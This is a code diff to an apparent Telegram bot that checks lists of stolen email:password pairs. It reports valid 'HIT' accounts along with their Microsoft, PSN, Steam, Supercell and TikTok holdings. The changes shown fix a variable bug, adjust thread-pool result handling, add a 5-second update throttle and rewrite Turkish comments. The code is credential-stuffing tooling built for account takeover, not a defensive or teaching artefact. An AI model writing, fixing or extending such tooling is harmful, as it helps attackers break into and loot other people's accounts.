@@ -318,7 +318,7 @@ class UnifiedChecker:
             return {
                 "status": "HIT", "email": email, "password": password, "inbox_count": inbox_count,
                 "ms_status": ms_res.get("status", "FREE"), "subscriptions": ms_res.get("subscriptions", []),
-                "psn_status": ps_res.get("psn_status", "FREE"), "psn_orders": ps_res.get("psn_orders", 0),
+                "psn_status": psn_res.get("psn_status", "FREE"), "psn_orders": psn_res.get("psn_orders", 0),
                 "steam_status": steam_res.get("steam_status", "FREE"), "steam_count": steam_res.get("steam_count", 0),
                 "supercell_status": sc_res.get("supercell_status", "FREE"),
                 "tiktok_status": tt_res.get("tiktok_status", "FREE"),
@@ -465,12 +465,11 @@ def process_combo_input(message, mode, threads):
         "chat_id": message.chat.id,
         "rm": rm,
         "start_time": time.time(),
-        "last_update_time": 0, 
+        "last_update_time": 0,  # 5 Saniyelik Throttling Icin Sifirlandi
         "is_running": True,
         "check_mode": mode,
         "threads": threads
     }
-
 
     with state_lock:
         active_scans[message.from_user.id] = scan_state
@@ -493,7 +492,7 @@ def run_checker_pool(user_id, accounts):
         
         try:
             res = checker.check(email, password)
-        except Exception as e:
+        except Exception:
             res = {"status": "BAD"}
 
         with state_lock:
@@ -517,8 +516,8 @@ def run_checker_pool(user_id, accounts):
             else:
                 state["bads"] += 1
 
-            # Her hesap kontrolü bittiğinde güvenli tetikleyiciyi çağır
-            update_live_results(user_id)
+        # Tabloyu guncellemek icin 5 saniyelik guvenli limiti cagiriyoruz
+        update_live_results(user_id)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
         executor.map(process_single, accounts)
@@ -532,13 +531,11 @@ def update_live_results(user_id):
 
     current_time = time.time()
     
-    # 1. İlk hesap kontrol edildiğinde ANINDA tetiklenir (böylece o "yükleniyor" yazısı hemen gider)
-    # 2. Sonraki kontrollerde Telegram API'yi yormamak için EN AZ 5 SANİYE geçmesini bekler.
-    # 3. Liste tamamen bittiğinde son durumu ekrana basmak için süreyi bypass eder.
+    # 5 SANIYE LIMITI BURADA UYGULANIYOR. Telegram api'nin kilitlenmesi engellendi.
     if state["checked"] > 1 and (current_time - state["last_update_time"] < 5.0) and state["checked"] != state["total"]:
         return
 
-    # Son güncelleme zamanını kaydet
+    # Zaman kaydini kilitliyoruz ki ust uste binmesin
     with state_lock:
         state["last_update_time"] = current_time
 
@@ -580,10 +577,9 @@ def update_live_results(user_id):
         )
     
     try:
-        # Doğrudan tek bir kanaldan edit atar, thread patlaması yaşatmaz
+        # Mesaj direk duzenleniyor, thread engeline takilmadan akacak.
         bot.edit_message_text(live_text, chat_id=state["chat_id"], message_id=state["status_msg_id"], parse_mode="Markdown")
     except Exception:
-        # Olası bir anlık Telegram block durumunda botun ve havuzun kilitlenmesini engeller
         pass
 
 def finalize_scan_session(user_id):
